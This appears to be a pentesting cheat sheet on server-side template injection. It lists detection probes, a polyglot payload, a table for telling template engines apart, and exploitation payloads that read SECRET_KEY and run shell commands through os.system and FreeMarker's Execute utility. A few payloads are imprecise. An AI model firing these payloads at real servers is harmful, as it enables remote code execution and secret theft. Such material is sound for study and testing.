# Server-Side Template Injection

Server-Side Template Injection (SSTI) is a vulnerability where user input is embedded into server-side templates and executed. This allows attackers to manipulate the template engine and potentially execute arbitrary code on the server.

Impact:

* Remote Code Execution (RCE)
* File read / delete
* Access sensitive data (API keys, SECRET_KEY)
* Full server compromise

---

## Detection

SSTI detection involves injecting template expressions and observing whether they are evaluated.

### Generic Payloads

```id="e8x9ov"
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

If response evaluates (e.g., `49`) → SSTI confirmed

---

### Polyglot Payload (Universal)

```id="k2y7xg"
${{<%[%'"}}%\.
```

Used to trigger errors across multiple template engines

---

### Template Syntax Variations

```id="c5ndc9"
{{ ... }}
${ ... }
#{ ... }
<%= ... %>
{ ... }
{{= ... }}
```

Test different syntaxes to identify engine

---

### Engine-Specific Payloads

#### Jinja2 / Flask

```id="e7m6xn"
{{7*7}}
{{7*'7'}}
{{config.items()}}
```

#### Django

```id="u9i2p1"
{{7*7}}   # may throw error
{{settings}}
```

#### Twig (PHP)

```id="r2yb3d"
{{7*7}}
{{dump()}}
```

#### FreeMarker (Java)

```id="m6k3fw"
${7*7}
${"test"?upper_case}
```

#### Velocity (Java)

```id="x4e8hz"
#set($x=7*7)$x
```

#### ERB (Ruby)

```id="z1q8nd"
<%= 7*7 %>
<%= "test".upcase %>
```

---

### Detection Techniques

#### Rendered (Direct Output)

Payload result is reflected in response

---

#### Error-Based

Trigger errors to identify engine

Example:

```id="b5k3rn"
{{1/0}}
```

Error reveals language:

* Python → ZeroDivisionError
* Java → ArithmeticException
* Node → ReferenceError
* PHP → Division by zero

---

#### Boolean-Based (Blind SSTI)

Compare responses:

```id="m9u3qp"
{{7*7}}
{{7*'a'}}
```

Different behavior → SSTI

---

#### Time-Based (Blind)

Trigger delay using engine-specific payloads

---

#### Out-of-Band (OOB)

Trigger external request (DNS / HTTP)

---

## Identifying Template Engine

| Payload | Likely Engine          |
| ------- | ---------------------- |
| {{ }}   | Jinja2 / Twig / Django |
| ${ }    | FreeMarker / Velocity  |
| <%= %>  | ERB                    |
| #{ }    | Thymeleaf              |

Use:

* Errors
* Syntax behavior
* Documentation

---

## Exploitation

Steps:

1. Confirm SSTI
2. Identify engine
3. Enumerate objects
4. Execute code / extract data

---

## Common Exploitation Techniques

### Access Internal Objects

```id="m0g7kx"
{{ settings.SECRET_KEY }}
```

---

### Code Execution

```id="d8w3rc"
{{os.system('ls')}}
```

---

### Built-in Utilities

```id="h4z2vn"
${"freemarker.template.utility.Execute"?new()("ls")}
```

---

### Import Modules

```id="y6r1sp"
{%import os%}
{{os.system('ls')}}
```

---

## Types of SSTI

### 1. Direct SSTI

Output is visible

### 2. Blind SSTI

No output, rely on behavior

### 3. Error-Based SSTI

Errors reveal info

---

## Notes

* Errors are very useful → always analyze them
* Polyglot payload is very effective
* Different engines behave differently
* Encoding can bypass filters
* Documentation is key for exploitation
* Unknown engine → identify → search payloads

---

## Quick Payloads

```id="p4k8zn"
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}

${{<%[%'"}}%\.

{{ settings.SECRET_KEY }}
{{os.system('ls')}}
${"freemarker.template.utility.Execute"?new()("ls")}
```
